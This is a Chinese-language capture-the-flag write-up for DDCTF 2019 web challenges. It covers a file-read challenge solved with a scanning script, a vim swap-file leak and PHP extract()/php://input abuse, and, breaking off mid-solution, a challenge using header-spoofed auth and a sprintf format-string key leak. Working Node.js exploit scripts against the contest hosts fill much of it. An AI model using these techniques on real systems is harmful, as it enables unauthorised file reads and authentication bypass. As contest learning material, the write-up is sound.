# DDCTF-2019 Writeups
> 一名 Node.js 选手的 DDCTF 2019 WP

## 0x00. Intro
上周侄子 ~~（对呀我就是老年组选手~~ 发来 [一个链接](https://ddctf.didichuxing.com/)，发现是类似十多年前 [CSKSoft](http://www.csksoft.net) 高手挑战 ([1](http://www.csksoft.net/netcompet1/game1.htm), [2](http://www.csksoft.net/NetCompet2/)) 的游戏，才知道原来现在 [CTF](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security) 氛围这么好，后知后觉之余仿佛打开了新世界的大门。


## 0x01. Web 1 - 滴
### 题目
> 滴~  
> 
> http://117.51.150.246  

### 解题过程
访问题目入口会自动跳转到这个地址：

```text
http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
```

拿到访问目标地址的 HTTP 包数据:

```http
GET /index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 HTTP/1.1
Host: 117.51.150.246
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://117.51.150.246/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Date: Thu, 18 Apr 2019 12:30:06 GMT
Server: Apache/2.4.7 (Unix) PHP/5.4.26
X-Powered-By: PHP/5.4.26
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html;charset=utf-8

<title>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</title>flag.jpg</br>flag.jpg</br><img src='data:image/gif;base64,/9j/4AAQSkZ...'></img>
```

看起来 QueryString 中 `jpg` 的值似乎经过了 base64 编码，于是直接在浏览器的 console 里尝试对其解码：

```javascript
atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09')
// <- "NjY2QzYxNjcyRTZBNzA2Nw=="
```

尝试二次 base64 解码：

```javascript
atob(atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'))
// <- "666C61672E6A7067"
```

解出的值像是 Hex，尝试用 Node.js 转成字符串：

```javascript
Buffer.from('666C61672E6A7067', 'hex').toString()
// <- 'flag.jpg'
```

嗯哼~ 得到的值与响应体中输出的 `flag.jpg` 一致，猜测可以通过修改 `jpg` 的值输出指定文件内容。

那么首先构造出读取当前页面 (`index.php`) 源文件的地址：

```javascript
const { base64 } = require('../common/utils')

function encode (filename) {
  let hex = Buffer.from(filename).toString('hex')
  return base64.encode(base64.encode(hex))
}

let url = `http://117.51.150.246/index.php?jpg=${encode('index.php')}`
// <- "http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3"
```

访问后发现页面上的字符串已经变成 `index.php`；然后提取出 `<img>` 的 `src` 值，[取出 base64 的部分](https://en.wikipedia.org/wiki/Data_URI_scheme#Syntax) 并做解码，便成功得到 [源文件内容](./web/1/clues/index.php)：

```php
<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */

?>
```

Review 代码后可以了解到：
1. 通过 `index.php` 接口可以读取指定文件内容（正如前面操作）;
2. 文件名的全部字符都先经白名单过滤，只允许英文、数字以及 `.` 通过；
3. 经过白名单过滤后，文件名再做黑名单过滤，`config` 将被转换成 `!`。

可以分析出：
1. 字符白名单天然挡掉了 `/`、`%`，杜绝了读取上级目录的可能；
2. 黑名单过滤存在明显的逻辑冲突，这导致最终文件名可以出现白名单中没有的 `!`；
3. 目前所能做的事情仅有读取指定文件，但我们仍未知道应该读取哪个文件。

那么剩下的线索只有 [文件头部注释的链接](https://blog.csdn.net/FengBanLiuYun/article/details/80616607) 了。
指过去的是 CSDN 的一篇博客 —— 「命令 echo」，但很明显此 `echo` 非 `index.php` 中的 `echo`，所以博文内容并没有包含什么有用的信息。

~~（倒是评论区已经开始「打卡」并「暴打出题人」了 wwwwww~~

于是尝试暴力扫描可能命中的文件，这里用 Node.js 快速写个脚本：

```javascript
const Queue = require('p-queue')
const Gauge = require('gauge')

const SCAN_CONCURRENCY = process.env.SCAN_CONCURRENCY || 5

async function scan (filenames, { fetch, isHit, concurrency = SCAN_CONCURRENCY }) {
  const queue = new Queue({ concurrency })
  const gauge = new Gauge()

  let count = 0
  let results = []

  queue.on('active', () => {
    gauge.show(`Fetching #${++count} / ${filenames.length}`, count / filenames.length)
  })

  filenames.forEach((filename) => queue.add(async () =>
    results.push(await fetch(filename)))
  )

  await queue.onIdle()
  gauge.hide()

  return results.filter(isHit)
}

const getStdin = require('get-stdin')
const got = require('got')
const cheerio = require('cheerio')
const flatten = require('just-flatten-it')
const { base64 } = require('../common/utils')

/**
 * Usage:
 *
 * ```sh
 * cat ./dict.txt | node ./scan.js
 * ```
 */
;(async () => {
  function encode (input) {
    let hex = Buffer.from(input).toString('hex')
    return base64.encode(base64.encode(hex))
  }

  async function fetch (filename) {
    const url = `http://117.51.150.246/index.php?jpg=${encode(filename)}`
    const { body } = await got(url)
    const $ = cheerio.load(body)
    return {
      filename,
      content: base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || ''),
    }
  }

  function isHit (response) {
    return !!response.content
  }

  let filenames = (await getStdin())
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean)

  let hits = await scan(filenames, { fetch, isHit })
  process.stdout.write(JSON.stringify(hits, null, 2))
})()
```

然后从 GitHub 找一个 [敏感文件名字典](https://github.com/SwiftieTerrence/ctfwebscan/blob/master/dic.txt)，开始扫描：

```sh
curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic.txt | node ./scan.js
```

扫描结果：
```json
[
  {
    "filename": "index.php",
    "content": "<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n"
  },
  {
    "filename": "robots.txt",
    "content": "excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n"
  }
]
```

无功而返，滴滴甚至还在 robots.txt 里放了个错误的 flag（感到深深的恶意。

~~那么这题至此就可以放弃了。~~

回到唯一的线索 —— [「命令 echo」](https://blog.csdn.net/FengBanLiuYun/article/details/80616607)。
翻遍作者的其它文章，~~通过阅读量和评论数~~ 找到另一篇文章 [「vim 异常退出 swp文件提示」](https://blog.csdn.net/FengBanLiuYun/article/details/80913909) ，似乎暗示着我们的目标是一个 vim 交换文件，于是针对文章中提到的三层交换文件修改扫描脚本：

```javascript
  // ...
  const flatten = require('just-flatten-it')

  let filenames = (await getStdin())
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean)
  
  filenames = flatten(filenames.map((name) => [
    name,
    `.${name}.swp`,
    `.${name}.swo`,
    `.${name}.swn`,
  ]))

  // ...
```

并把文中示例使用的文件名 `practice.txt` 也加入字典：

```sh
{ curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/master/dic.txt ; echo "\npractice.txt" } | node ./scan.js
```

但依旧扫不到新的文件。

~~那么这题至此又可以放弃了。~~

在被这道关卡卡住一天之后，看着 `index.php` 中的 `</br>`，我鬼使神差地意识到出题人也许还犯了其他低级错误。于是把扫描脚本改为：

```diff
  filenames = flatten(filenames.map((name) => [
    name,
-    `.${name}.swp`,
+    `${name}.swp`,
-    `.${name}.swo`,
+    `${name}.swo`,
-    `.${name}.swn`,
+    `${name}.swn`,
  ]))
```

再次扫描，得到结果：

```json
[
  {
    "filename": "index.php",
    "content": "<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n"
  },
  {
    "filename": "robots.txt",
    "content": "excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n"
  },
  {
    "filename": "practice.txt.swp",
    "content": "f1ag!ddctf.php"
  }
]
```

惊了。

心情复杂.jpg  
~~我替黄旭东祝滴滴越办越好~~

无论如何，终于还是拿到了下一个线索 `flag!ddctf.php`。
结合前面对 `index.php` 的解读，这一步就显得非常简单了：

```javascript
// ...
let url = `http://117.51.150.246/index.php?jpg=${encode('flagconfigddctf.php')}`
// <- "http://117.51.150.246/index.php?jpg=TmpZMll6WXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ=="
```

再用与前面相同的方法 —— 提取 `<img>` 的 `src`，并做 base64 解码；便轻松获取到了 `flag!ddctf.php` 的内容：

```php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
        {
                echo $flag;
        }
        else
        {
                echo'hello';
        }
}

?>
```

Review 后发现这里涉及两个 ~~CTF~~ 常见的 PHP 的安全问题：
1. [extract() 变量覆盖](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract)
2. [远程文件包含 - PHP 流 input](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3)

构造请求参数 `k=php://input`，使 `$content` 值等于 Request Body 的内容；并把相同的值（如 `yelo`）传入参数 `uid` 和 Request Body；使得最终 `$uid == $content`：

```javascript
const got = require('got')

;(async () => {
  const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
  const { body } = await got.post(url, {
    body: 'yelo',
  })
  console.log(body)
  // <- "DDCTF{436f6e67726174756c6174696f6e73}"
})()
```

获得 flag `DDCTF{436f6e67726174756c6174696f6e73}`，拿下第一关 :v:。

### Bonus
等一等，flag 的值看起来是一段 Hex，转字符串试试：

```javascript
Buffer.from(:436f6e67726174756c6174696f6e73', 'hex').toString()
// <- "Congratulations"
```

![](https://media.giphy.com/media/1g37uzZ6mSu8GDOczN/giphy.gif)  
![](https://media.giphy.com/media/8Rx1VaCae7OCs/giphy.gif)  

### 涉及资料
- 源代码
  - [扫描器脚本](./web/1/scan.js)
  - [完整通关脚本](./web/1/index.js)
- 知识点
  - [data URI scheme - Syntax](https://en.wikipedia.org/wiki/Data_URI_scheme#Syntax)
  - [Node.js - Buffer](https://nodejs.org/dist/latest-v11.x/docs/api/buffer.html)
  - [PHP extract() 变量覆盖](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract)
  - [PHP 远程文件包含 - PHP 流 input](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3)


## Web 0x02 WEB 签到题
### 题目
> WEB 签到题  
> 
> http://117.51.158.44/index.php

### 解题过程
打开题目入口后，页面显示 *抱歉，您没有登陆权限，请获取权限后访问-----*。~~（录字打错了兄弟~~

首页的 HTTP 包数据：

```http
GET /index.php HTTP/1.1
Host: 117.51.158.44
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 19 Apr 2019 07:52:14 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

<html>
<head>
    <head lang="en">
        <meta charset="UTF-8">
        <title>DiDiCTF</title>
        <link rel="stylesheet" href="highlight/styles/default.css">
        <script src="highlight/highlight.pack.js"></script>

    <style>
        body{TEXT-ALIGN: center;}
        center{ MARGIN-RIGHT: auto;
            MARGIN-LEFT: auto;
            height:200px;
            background: #fdfffb;
            width:600px;
            vertical-align:middle;
            line-height:500px;
        }
    </style>

    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/index.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <body onload="auth()">
        <div class='center' id="auth">
        </div>


    </body>
</head>
</html>
```

没发现什么有用的信息，那么继续往下查看 `js/index.js`：

```javascript
/**
 * Created by PhpStorm.
 * User: didi
 * Date: 2019/1/13
 * Time: 9:05 PM
 */

function auth() {
    $.ajax({
        type: "post",
        url:"http://117.51.158.44/app/Auth.php",
        contentType: "application/json;charset=utf-8",
        dataType: "json",
        beforeSend: function (XMLHttpRequest) {
            XMLHttpRequest.setRequestHeader("didictf_username", "");
        },
        success: function (getdata) {
           console.log(getdata);
           if(getdata.data !== '') {
               document.getElementById('auth').innerHTML = getdata.data;
           }
        },error:function(error){
            console.log(error);
        }
    });
}
```

在请求头中塞入 username 明显是个诡异的操作。

打开浏览器控制台，重新定义 `auth` 方法（顺便格式化一下代码）：
```diff
- function auth () {
+ function auth (username) {
...
-      XMLHttpRequest.setRequestHeader('didictf_username', '')
+      XMLHttpRequest.setRequestHeader('didictf_username', username)
...
```

```javascript
 function auth (username) {
  $.ajax({
    type: 'post',
    url: 'http://117.51.158.44/app/Auth.php',
    contentType: 'application/json;charset=utf-8',
    dataType: 'json',
    beforeSend (XMLHttpRequest) {
      XMLHttpRequest.setRequestHeader('didictf_username', username)
    },
    success (getdata) {
      console.log(getdata)
      if (getdata.data !== '') {
        document.getElementById('auth').innerHTML = getdata.data
      }
    },
    error (error){
      console.log(error)
    },
  })
}
// <- undefined
```

~~舒服多了，~~ 然后试下 `admin`：

```javascript
auth('admin')
// <- undefined
// {errMsg: "success", data: "您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php"}
// XHR finished loading: POST "http://117.51.158.44/app/Auth.php".
```

一发入魂。（不愧是我.gif

紧接着跟着提示来到 [`app/fL2XID2i0Cdh.php`](./web/2/clues/fL2XID2i0Cdh.php)，获得两份文件的源代码。

[Application.php](./web/2/clues/app/Application.php)：

```php
<?php
/**
 * url:app/Application.php
 */

Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}

?>
```


[Session.php](./web/2/clues/app/Session.php)：

```php
<?php
/**
 * url:app/Session.php
 */

include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();

?>
```

分解 Review 一下：

1. Application 作为父类，提供身份验证方法 (`auth`)；但该方法 **信任请求体数据**，所以在前面就已经被轻松攻破了。

    ```php
    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    ```
    (Application.php:L19-L27)

2. Application 作为父类，提供打印信息至响应体的方法 (`response`)；该方法可以被重复调用，所以可能会输出多段连续的 JSON 字符串。

    ```php
    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }
    ```
    (Application.php:L10-L17)

3. Application 作为父类，定义了 **解构方法**；在解构过程中 **可以输出指定路径的文件内容**，但条件是路经值长度为 18，且该路径值会先经历一次 sanitize；路经值取 `$this->path`，但代码中并没有出现更改值的接口。

    ```php
    public function __destruct() {
        if(empty($this->path)) {
            exit();
        }else{
            $path = $this->sanitizepath($this->path);
            if(strlen($path) !== 18) {
                exit();
            }
            $this->response($data=file_get_contents($path),'Congratulations');
        }
        exit();
    }
    ```
    (Application.php:L37-L48)

4. 对路径做 sanitize 的函数会先去除了值头尾的空格，然后依次过滤 **一次** `'../'` 和 `'..\\'`。

    ```php
    private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
    }
    ```
    (Application.php:L30-L35)

5. Session 继承于 Application。

    ```php
    class Session extends Application {
    ```
    (Session.php:L7)

6. Session 提供了一个加载 key 的方法 (`get_key`)；执行后会将 `key.txt` 文件的内容写入变量 `$this->eancrykey`。~~（encrypt 也拼错了兄弟~~

    ```php
    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }
    ```
    (Session.php:L36-L39)

7. 仅在 `auth` 成功时会触发执行 `get_key`。

    ```php
    if(parent::auth()) {
              $this->get_key();
    ```
    (Session.php:L21-L22)

8. 在 `get_key` 方法的注释中写道：

    ```php
    //eancrykey  and flag under the folder
    ```
    (Session.php:L37)

    疯狂暗示目标文件为 `../config/flag.txt`。

9.  Session 提供了读写 session 的方法 `session_read` 和 `session_create`。
10. `session_create` 的代码解释了 cookie 中 ddctf_id (即 session) 字段的结构：
  
    ```php
    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
    ```
    (Session.php:L86-L111)

    其中：
    ```php
    $cookiedata = serialize($userdata);
    $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);`
    ```

    换个容易理解的写法即：
    ```php
    // 通过序列化 $userdata 生成 $payload
    $payload = serialize($userdata);
    // 使用 $key 对 $payload 做签名，防止客户端随意篡改 session
    $session = $payload.md5($key.$payload);
    ```


11. 由于构建 session 值时需要序列化 `$userdata`，所以在读取操作 `session_read` 中也就需要 **反序列化** `$payload`。

    ```php
    $session = unserialize($session);
    ```
    (Session.php:L58)

12. `session_read` 中出现了一个诡异的操作，可以通过 POST nickname 字段触发；在这个操作中还出现了 **对同一值重复 `sprintf`**：

    ```php
    if(!empty($_POST["nickname"])) {
        $arr = array($_POST["nickname"],$this->eancrykey);
        $data = "Welcome my friend %s";
        foreach ($arr as $k => $v) {
            $data = sprintf($data,$v);
        }
        parent::response($data,"Welcome");
    }
    ```
    (Session.php:L65-L72)


那么，首先利用 #12 出现的漏洞，向 `/app/Session.php` 发送 POST 请求，并使得 `$_POST["nickname"] == "%s"`；同时根据 #6 和 #7，沿用前面攻破 `auth` 的方法，保证 `get_key` 会被执行：

```javascript
const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

const FormData = require('form-data')

;(async () => {
  const client = createClient()
  const url = 'http://117.51.158.44/app/Session.php'

  // create session
  await client.post(url)

  // get the key
  let form = new FormData()
  form.append('nickname', '%s')

  let response = await client.post(url, {
    body: form,
  })
  console.log(response.body)

})()
```

观察 Node.js 打印的日志：

```json
